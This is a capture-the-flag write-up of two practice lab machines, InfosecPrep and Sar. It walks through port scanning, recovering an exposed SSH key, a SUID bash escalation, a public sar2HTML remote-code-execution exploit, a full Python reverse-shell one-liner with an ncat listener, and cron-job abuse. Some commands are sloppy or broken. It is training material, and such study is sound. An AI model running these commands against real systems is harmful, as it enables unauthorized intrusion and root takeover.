# Machine: InfosecPrep

- Vulnerability: Privilege Escalation

- The severity of the issue: Meduim

- Description :

with the vulnerability, an attacker can gain unauthorized privileged access to a system

- Reproduction :

Going to our browser with the provided ip_add

With it (IP Address of the machine) the first thing got in mind is to grab a series of ports with the use of Nmap

	nmap -a ip_add
	
	port => 80, 22 (good)!
  
Then with The help of Nikto, we can scan web servers for known vulnerabilities 

	nikto -host ip_add

After that we've some directories we've tested the common robots.txt which tells the search engines which directories not to enter :
 
	ip_add/robots.txt
	
	output -> /secret.txt
  
This seems like an interesting place to visit, after that we've got a text seems like a base64 encoded file with the equal sign the end first guess i thought let's decoded it
 
	wget ip_add/secret.txt ; cat secret.txt ; base64 -d > ssh_key.txt 
 
This is actually a private key and based on our previous scan we've noticed a port for ssh connection 22 
 
then we thought why not connect with the user 'oscp' and the host ip_add using the private key after changing their permissions (Secure) : 
 
	chmod 600 ssh_key.txt ; ssh -i ssh_key.txt user@ip_add -p 22 
 
Bingo we've login and we've got our first flag called local;
 

Let's scan with a tool just trying to search for possible and available exploits i'm using Linpeas :

	wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh ; chmod +x linpeas.sh ; ./linepeas 

though the scan of Linepeas we've noticed a suid in the bash builtin command (indicates that the file has the setuid bit set) which means we can gain access through a ;

	/bin/bash -p
	whoami 
	
with the -p option through some googling it turns up it's a bug that allows the default shell to run with SUID privileges meaning that we have permission to run with the owner privilege

I gain access and i become a root

	cd /root/ ; cat proof.txt
	
Done!

# Resources:

https://gtfobins.github.io/gtfobins/bash/

man nmap, nikto

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS 


# Machine: Sar

- Vulnerability: Remote Code Execution (RCE)

- The severity of the issue: High

- Description :

an attacker can remotely execute commands on someone else's computing device

- Reproduction :

Going to our browser with the provided ip_add, it's a default page for the Apache2 server i've read and it has nothing

As always the first thing got in mind is to grab a series of ports with the use of Nmap

	nmap -a ip_add
	
	we've got only an open port for http communication 80

  
testing our robots.txt:
 
	ip_add/robots.txt

It has a directory for sar2HTML i enter, and i've read the full page and i got no idea the first thing i did is to google the name of sar2HTML, and it turns up it a command execution and i've looked for the verified one using in exploit-db :

	searchsploit sar2HTML
	
the exploit is a python script i creat a rce.py file that has the script, good!

i've run the script and i required the url, i've to give him the url with the sar2HTML path;

	python3.9 rce.py
	
	url -> http://ip_add/sar2HTML/

then i require a command ;

	cmd => ls
	
good we've got for ourselves a remote code execution, since we're dealing with rce it would be useful to use the reverse shell in order to communicate (i'll be using python3 (already checked if it exists)):

	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("My_machine_ip_add",Port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
	
	-c option to run full syntaxes in single line

on the other side, i'm listing through the port i've specified early 
 
	ncat -lvp 1010


with both we've got for ourselves a connection with the victim machine, based on the other machine starting our search for a flag maybe called local.txt;

	find / -type f -name local.txt 2> /dev/null
	
bingo we've got a flag good

for this part i'm back to my favorite tool Linpeas :

	./linepeas 

we've noticed a crontab runnign every 5 min */5 with sudo priviliege located in /var/www/html/finally.sh ;

	ls -la ; cat ./finally.sh
	
noticed that we don't have permission to modify on the finally script but he can run the write.sh that we have privileges so why not modify it to become ;
	touch output.txt ; chmod 777 output.txt
	cd /root/ ; ls -la >  output.txt
	
since the output always shows up at the root machine i thought to redirect it to a file after playing the waiting game for 5 min the script runs successfully and i was able to see the file in the root directory 


since we've soul the files, i've modified the file to output anything to my file ;


	cd /root/ ; ls -la >  output.txt  

# Resources:
as always man pages for the tools i've used

https://www.exploit-db.com/exploits/49344

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/655cec1f1a438fa611777deedd2a19a26aff8485/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
